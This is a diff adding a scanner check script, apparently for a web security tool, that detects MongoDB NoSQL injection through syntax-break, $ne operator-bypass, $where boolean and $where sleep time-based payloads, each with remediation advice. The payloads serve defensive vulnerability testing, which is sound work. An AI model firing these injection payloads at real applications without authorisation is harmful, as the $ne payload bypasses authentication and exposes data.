@@ -1,0 +1,66 @@
+# MongoDB NoSQL Injection Detection
+# Tests syntax break, operator injection, boolean-based, and time-based NoSQLi
+
+given insertion_point: "json"  # Assumes JSON body (e.g., {"username": "input"})
+
+# Extract baseline response
+extract original_body from response.body
+extract original_status from response.status
+extract original_time from response.time
+
+# 1. Syntax Break: Trigger MongoDB error with quote
+send request:
+  replace insertion_point with insertion_point + "'"
+if regex `MongoError|SyntaxError.*JSON|Unexpected token` in response.body then
+  report issue:
+    severity: high
+    confidence: certain
+    name: "MongoDB NoSQL Injection (Syntax Break)"
+    detail: "MongoDB syntax error detected with payload: {insertion_point + '''}. Response: {regex `MongoError|SyntaxError.*JSON|Unexpected token`}"
+    remediation: "Use MongoDB's query builders or parameterized queries; sanitize inputs."
+end if
+
+# 2. Operator Injection: Bypass with $ne (always true)
+send request:
+  replace insertion_point with `{"$ne": null}`  # For auth bypass, e.g., password[$ne]=null
+extract bypass_response from response.body
+
+if bypass_response != original_body and response.status == 200 then  # Success response indicates bypass
+  report issue:
+    severity: high
+    confidence: firm
+    name: "MongoDB NoSQL Injection (Operator Bypass)"
+    detail: "Query bypassed with $ne: null payload. Response changed from original."
+    remediation: "Avoid dynamic query construction; use safe operators like $eq."
+end if
+
+# 3. Boolean-Based: True/false conditions via $where JS
+send request:
+  replace insertion_point with `{"$where": "this.username == 'test'"}`  # True condition
+extract true_response from response.body
+
+send request:
+  replace insertion_point with `{"$where": "this.username == 'invalid'"}`  # False condition
+extract false_response from response.body
+
+if true_response != false_response and true_response == original_body then
+  report issue:
+    severity: high
+    confidence: firm
+    name: "MongoDB NoSQL Injection (Boolean-Based)"
+    detail: "Response differed between true/false $where conditions. True payload: {\"$where\": \"this.username == 'test'\"}"
+    remediation: "Disable $where or sanitize JS inputs; prefer aggregation pipelines."
+end if
+
+# 4. Time-Based: JS delay in $where
+send request:
+  replace insertion_point with `{"$where": "sleep(5000); true"}`  # Simulate delay (MongoDB sleep)
+  set timeout to 10 seconds
+if response.time > original_time + 5000 then
+  report issue:
+    severity: high
+    confidence: tentative
+    name: "MongoDB NoSQL Injection (Time-Based)"
+    detail: "Response delayed by {response.time - original_time}ms with $where sleep payload."
+    remediation: "Disable server-side JS (--noscripting); use safe queries."
+end if
